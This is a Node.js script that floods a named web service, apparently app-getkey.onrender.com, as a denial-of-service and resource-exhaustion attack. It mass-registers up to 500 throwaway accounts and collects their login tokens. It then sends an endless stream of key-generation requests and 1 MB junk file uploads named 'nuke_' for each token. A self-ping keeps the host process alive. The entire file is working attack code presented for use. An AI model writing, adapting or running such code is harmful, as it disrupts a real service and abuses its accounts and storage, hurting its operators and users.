const http = require('http');
const target = process.env.TARGET_URL || 'https://app-getkey.onrender.com';
const port = process.env.PORT || 10000;
const accCount = parseInt(process.env.ACC_COUNT || '500');
const bigContent = 'A'.repeat(1048576);
let reqCount = 0;
const tokens = [];

const randStr = (len) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < len; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
};

const randPass = () => randStr(8) + '@' + randStr(4);

const spamKey = (token) => {
  const send = () => {
    fetch(target + '/api/keys/generate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify({ durationMs: 604800000 })
    }).catch(() => {});
    reqCount++;
    setImmediate(send);
  };
  send();
};

const spamCode = (token) => {
  const send = () => {
    fetch(target + '/api/uploads/code', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify({
        content: bigContent,
        filename: 'nuke_' + Date.now() + '_' + randStr(6) + '.txt',
        note: ''
      })
    }).catch(() => {});
    reqCount++;
    setImmediate(send);
  };
  send();
};

const registerAndGetToken = async (i) => {
  const username = 'x' + randStr(8) + '_' + i;
  const password = randPass();
  try {
    await fetch(target + '/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const res = await fetch(target + '/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    if (data.token) tokens.push(data.token);
  } catch (e) {}
};

const startSpam = async () => {
  for (let i = 0; i < accCount; i++) {
    await registerAndGetToken(i);
  }
  for (const token of tokens) {
    spamKey(token);
    spamCode(token);
  }
};

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Requests sent: ' + reqCount);
});

server.listen(port, () => {
  startSpam();
  setInterval(() => {
    fetch(`http://localhost:${port}`).catch(() => {});
  }, 600000);
});
